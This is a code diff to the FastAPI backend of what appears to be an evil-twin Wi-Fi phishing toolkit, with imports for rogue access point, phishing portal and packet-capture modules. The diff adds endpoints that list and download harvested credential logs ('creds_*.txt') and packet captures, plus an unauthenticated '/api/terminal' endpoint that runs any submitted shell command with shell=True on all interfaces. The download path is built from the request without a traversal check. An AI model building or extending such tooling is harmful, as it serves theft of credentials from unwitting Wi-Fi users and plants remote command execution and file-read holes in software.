@@ -1,13 +1,14 @@
-from fastapi import FastAPI, Request
+# backend/api_server.py
+from fastapi import FastAPI, Request, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import JSONResponse
+from fastapi.responses import JSONResponse, FileResponse
 from pydantic import BaseModel
 import subprocess
 import os
 from pathlib import Path
 
 from modules.evil_twin import EvilTwinAP
-from modules.phishing_portal_loader import PortalTemplateManager
+from modules.phishing_portal_loader import PortalTemplateManager, prompt_passphrase, load_fernet_from_passphrase
 from modules.packet_capture import PacketCapture, enable_monitor_mode, disable_monitor_mode
 
 app = FastAPI()
@@ -25,12 +26,16 @@ template_manager = PortalTemplateManager()
 pcap = PacketCapture()
 
 LOGS_DIR = Path("./phishing_portal/logs")
+PCAP_DIR = Path("./captures")
 
 class SSIDPayload(BaseModel):
     ssid: str
 
 class TemplatePayload(BaseModel):
     name: str
+
+class TerminalInput(BaseModel):
+    cmd: str
 
 @app.get("/api/templates")
 def get_templates():
@@ -82,6 +87,37 @@ def get_live_packets():
     packets = pcap.get_live_packets()
     return JSONResponse(content=packets)
 
+@app.post("/api/terminal")
+def terminal_exec(data: TerminalInput):
+    try:
+        result = subprocess.run(data.cmd, shell=True, capture_output=True, text=True, timeout=5)
+        return {"output": result.stdout or result.stderr}
+    except Exception as e:
+        return {"output": str(e)}
+
+@app.get("/api/list_files")
+def list_files():
+    files = []
+    for f in LOGS_DIR.glob("creds_*.txt"):
+        files.append({"type": "logs", "name": f.name})
+    for f in PCAP_DIR.glob("*.pcap"):
+        files.append({"type": "pcaps", "name": f.name})
+    return JSONResponse(content=files)
+
+@app.get("/api/download/{file_type}/{filename}")
+def download_file(file_type: str, filename: str):
+    if file_type == "logs":
+        path = LOGS_DIR / filename
+    elif file_type == "pcaps":
+        path = PCAP_DIR / filename
+    else:
+        raise HTTPException(status_code=404, detail="Invalid file type")
+    if not path.exists():
+        raise HTTPException(status_code=404, detail="File not found")
+    return FileResponse(path)
+
 if __name__ == "__main__":
     import uvicorn
+    print("\n[*] Toolkit backend is starting...")
+    print("[*] Ensure phishing templates are decrypted using passphrase prompt when activating.")
     uvicorn.run("api_server:app", host="0.0.0.0", port=8000, reload=True)
